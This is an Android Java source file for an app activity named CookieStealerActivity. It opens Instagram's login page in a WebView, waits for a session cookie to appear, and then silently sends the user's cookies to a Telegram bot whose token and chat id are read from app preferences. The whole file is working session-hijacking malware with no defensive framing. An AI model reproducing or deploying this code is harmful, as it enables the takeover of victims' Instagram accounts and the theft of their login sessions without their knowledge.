package com.hakodzhak.god;
import android.app.Activity;
import android.os.Bundle;
import android.webkit.CookieManager;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
public class CookieStealerActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        WebView webView = new WebView(this);
        setContentView(webView);
        CookieManager.getInstance().setAcceptCookie(true);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.setWebViewClient(new WebViewClient() {
            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);
                String cookies = CookieManager.getInstance().getCookie(url);
                if (cookies != null && cookies.contains("sessionid")) {
                    sendCookies(cookies);
                }
            }
        });
        webView.loadUrl("https://www.instagram.com/accounts/login/");
    }
    private void sendCookies(String cookies) {
        new Thread(() -> {
            try {
                String botToken = getSharedPreferences("config", MODE_PRIVATE).getString("botToken", "");
                String chatId = getSharedPreferences("config", MODE_PRIVATE).getString("chatId", "");
                String text = "🍪 *كوكيز!*\n\n" + cookies;
                String url = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + URLEncoder.encode(text, "UTF-8") + "&parse_mode=Markdown";
                HttpURLConnection con = (HttpURLConnection) new URL(url).openConnection();
                con.getInputStream();
            } catch (Exception e) {}
        }).start();
    }
}
